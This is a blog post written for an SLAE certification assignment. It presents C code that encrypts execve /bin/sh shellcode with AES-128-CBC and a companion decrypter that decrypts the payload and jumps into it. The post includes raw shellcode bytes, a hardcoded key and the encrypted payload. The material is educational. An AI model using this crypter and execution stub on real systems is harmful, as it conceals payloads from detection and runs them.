---
layout: post
title: SLAE Assignment 7 - Crypter (Linux/X86)
---

The last assignment is to create a crypter which  will encrypt the shellcode.

Our goal for this assignment is:
- Create Crypter
- Can use any encryption scheme
- Can use any programming language for implementation

<!-- more -->

### Encryption Scheme - [RIJNDAEL-128-CBC]
I decided to use existing encryption scheme **Rijndael-128-CBC**. Rijndael is a symmetric block cipher, designed by Joan Daemen and Vincent Rijmen, and was approved for the USA's NIST Advanced Encryption Standard, FIPS-197. The cipher has a variable block length and key length. Rijndael can be implemented very efficiently on a wide range of processors and in hardware. The design of Rijndael was strongly influenced by the design of the block cipher Square. There exist three versions of this algorithm, namely: RIJNDAEL-128 (the AES winner) , RIJNDAEL-192 , RIJNDAEL-256. The numerals 128, 192 and 256 stand for the length of the block size.

### Programming Language
Choosing the programming language was not a hard thing for me. I will be using "C" language along with the **libmcrypt** encryption/decryption library to implement the Crypter.



### AES RIJNDAEL-128-CBC Implementation
Before we dive into actual implementation, let us look at the encryption sheme.
- Rinjndael-128 (128 bit block size)
- Uses CBC (cipher block chaining) mode.
- Key size 128 bit (16 byte)

Below is the fully commented code for the Crypter implementation. The execve /bin/sh shellcode is used in the below code.
```c
/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: AES-RIJNDAEL-128-CBC Encrypt shellcode using libmcrypt
* Filename	: AESCrypter.c
*
* mcrypt API details - https://linux.die.net/man/3/mcrypt
* sudo apt-get install libmcrypt-dev
* gcc AESCrypter.c -o AESCrypter -lmcrypt
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>


// Function that encrypts the shellcode
int AES_ENCRYPT(
    void* buffer,
    int buffer_len, /* the shellcode could include null bytes*/
    char* IV,
    char* key,
    int key_len
){
  
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);

  int blocksize = mcrypt_enc_get_block_size(td);
  
  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
 
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);

  /*
  *	main encryption function. td is the encryption descriptor returned by mcrypt_generic_init(). 
  *	buffer contains the shellcode wewish to encrypt and buffer_len is the length (in bytes) of shellcode.
  *	Returns 0 on success.
  */
  mcrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td)
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td. 
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // execve /bin/sh shellcode
  char * shellcode = \
  "\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

  int ctr;
  int shellcode_len;
  shellcode_len = strlen(shellcode);
 
  // Initializaion Vector
  char* IV = "BLEHBLAHBLEHBLAH";

  // key
  char *key = "ub3r53cr3t435k3y";
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64; 

  buffer = calloc(1, buffer_len);
  // Copy the shellcode to a buffer
  strncpy(buffer, shellcode, buffer_len);

  printf("\n==Original Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", shellcode[ctr]&0xff);
  }
  printf("\n");

  //Encrypt buffer
  AES_ENCRYPT(buffer, buffer_len, IV, key, keysize); 

  printf("\n==Encrypted Shellcode==\n");
  for(ctr=0;ctr<buffer_len;ctr++){
       printf("\\x%02x", buffer[ctr]&0xff);
  }
  printf("\n\n");

  return 0;
}
```
Lets compile this and run the Crypter executable.
![asn-7-crypter-out](/assets/SLAE-x86/asn-7-crypter-out.PNG)

As we can see, the encrypted shellcode length is few bytes more than the original shellcode, infact it is equal to the buffer size we have specified in the code [64]. Our buffer length should be such that it should accomodate our shellcode and should be k*algorithms_block_size.

With that out of the way, lets move on to the decryption.
### Decryption Implementation
The Decrytper will decrypt the encryted shellcode and will pass control to the decrypted shellcode once decryption is completed. Below is the fully commented code for the decrypter.
```c
/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: Decrypts AES-RIJNDAEL-128-CBC Encrypted shellcode and Executes
* Filename	: AESCrypter.c
*
* sudo apt-get install libmcrypt-dev
* gcc AESDeCryptExec.c -o AESDeCryptExec -lmcrypt -fno-stack-protector -z execstack
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

// Function that Decrypts the shellcode
int AES_DECRYPT(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);

  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
  
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);
 
  // The decryption function. Returns 0 on success. 
  mdecrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td). Actually it clears all buffers.
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td.
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // Encrypted shellcode
  char * encr_shellcode = \
  "\xb4\x35\x28\x01\x6b\xfc\xf1\x8d\x01\x06\xf3\xc7\x23\x3e\xdd\xd9\x54\xc4\xa2\xa1\xe9\x9f\x2e\x67\x7c\x88\xae\x58\x5d\x40\x32\x3a\x74\x0b\xe6\x49\xd8\xa6\x16\x8c\x4b\x90\x6b\xd5\xfb\x7f\x2c\x95\x68\xcc\x91\xf4\xe7\xea\x8e\x9c\xc6\x4c\xb7\x72\x3b\x8d\x51\x50";
  
  int ctr;
  int shellcode_len;
  shellcode_len = strlen(encr_shellcode);
 
  // Initializaion Vector
  char* IV = "BLEHBLAHBLEHBLAH";

  // Encryption Key
  char *key = "ub3r53cr3t435k3y";
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, encr_shellcode, buffer_len);

  int (*ret)() = (int(*)())buffer;

  // Display the encrypted shellcode
  printf("\n==Encrypted Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", encr_shellcode[ctr]&0xff);
  }
  printf("\n");

  // Decrypt Buffer
  AES_DECRYPT(buffer, buffer_len, IV, key, keysize);
  printf("\n==Decrypted Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", buffer[ctr]&0xff);
  }

  printf("\n\n==Jumping to Decrypted Payload==\n");
  ret();
}
```

Lets see the Decrypter in action. Compiling and executing the Decrypter.
![asn-7-decrypter-out](/assets/SLAE-x86/asn-7-decrypter-out.PNG)

And we are done :)

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: **SLAE-933**
